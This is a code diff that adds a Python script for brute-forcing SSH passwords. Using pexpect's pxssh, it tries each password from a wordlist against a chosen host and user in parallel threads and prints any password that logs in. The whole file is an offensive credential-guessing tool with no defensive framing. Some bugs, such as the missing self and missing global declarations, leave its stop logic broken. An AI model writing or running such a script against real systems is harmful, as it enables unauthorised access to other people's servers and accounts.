@@ -1,0 +1,71 @@
+from pexpect import pxssh
+import argparse
+import time
+from threading import *
+
+maxConnections = 5
+connection_lock = BoundedSemaphore(value=maxConnections)
+Found = False
+Fails = 0
+
+class Parser:
+	def __init__(self):
+		self.args = argparse.ArgumentParser(description="SSH bruteforce")
+		self.args.add_argument("-H", help="Target host", type=str)
+		self.args.add_argument("-F", help="passwdFile", type=str)
+		self.args.add_argument("-u", help="User you want to choose", type=str)
+
+		self.args_parsed = self.args.parse_args()
+
+	def get_host(self):
+		return self.args_parsed.H
+
+	def get_passwd_file(self):
+		return self.args_parsed.F
+
+	def get_username(self):
+		return self.args_parsed.u
+
+class Connection:
+	
+	def connect(host, user, password, release):
+		try:
+			s = pxssh.pxssh()
+			s.login(host, user, password)
+			print(f"\n[+] Got password: {password}")
+			Found = True
+		except Exception as e:
+			if 'read_nonblocking' in str(e):
+				Fails += 1
+				time.sleep(5)
+				connect(host, user, password, False)
+			elif 'synchronize with original prompt' in str(e):
+				time.sleep(1)
+				connect(host, user, password, False)
+		finally:
+			if release: connection_lock.release()
+
+if __name__ == '__main__':
+	host = Parser().get_host()
+	passwdFile = Parser().get_passwd_file()
+	user = Parser().get_username()
+
+	if not host or not passwdFile or not user:
+		print("usage")
+
+	fn = open(passwdFile, "r")
+
+	for line in fn.readlines():
+		if Found:
+			print("\n[*] Exiting Password Found")
+			exit(0)
+		if Fails > 5:
+			print("[!] Exiting: Too Many Socket Timeouts")
+			exit(0)
+		connection_lock.acquire()
+
+		password = line.strip("\r").strip("\n")
+		print(f"\n[-] Testing: {password}")
+
+		t = Thread(target=Connection.connect, args=(host, user, password, True))
+		t.start()
